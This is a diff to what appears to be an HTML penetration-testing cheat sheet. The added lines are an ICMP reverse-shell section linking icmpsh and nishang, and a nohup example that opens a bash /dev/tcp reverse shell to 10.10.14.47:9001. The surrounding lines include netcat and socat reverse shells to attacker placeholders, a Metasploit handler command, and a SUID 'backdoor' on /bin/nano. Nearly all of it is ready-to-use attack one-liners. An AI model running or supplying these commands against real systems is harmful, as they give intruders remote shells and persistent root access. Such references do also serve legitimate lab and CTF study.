@@ -672,6 +672,18 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER's_IP_ADDRESS] [A
 socat file:`tty`,raw,echo=0 tcp-listen:443	#attacker
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[LHOST_IP]:443 #victim
 </pre>
+<p><font size="3.5" color="black">ICMP</font></p>
+<pre style="background-color:black;color:white;">
+#Download
+https://github.com/inquisb/icmpsh
+https://github.com/samratashok/nishang
+
+#Usage
+/nishang/Shells/Invoke-PowerShellIcmp.ps1
+
+#Example
+https://www.youtube.com/watch?v=IbVmpr6IFQU&t=995s	(HTB - Minion)
+</pre>
 <p><font size="3.5" color="black">MSF stuff</font></p>
 <pre style="background-color:black;color:white;">
 msfconsole -x "use exploit/multi/handler;set LHOST [ATTACKER's_IP_ADDRESS];set LPORT [ATTACKER's_PORT];set PAYLOAD [PAYLOAD];run"
@@ -1265,7 +1277,7 @@ chmod u+s /bin/nano    # installs the backdoor
 <hr>
 <p><h3>More</h3></p>
 <pre style="background-color:black;color:white;">
-nohup - run a command immune to hangups, with output to a non-tty
+nohup - run a command immune to hangups, with output to a non-tty (example: "nohup bash -i >& /dev/tcp/10.10.14.47/9001 0>&1 &")
 exiftool [FILE]	#extract file's metadata
 binwalk #tool for searching binary images for embedded files and executable code
 sort [WORDLIST_PATH] | uniq          (Outputs unique words in a wordlist that is found)
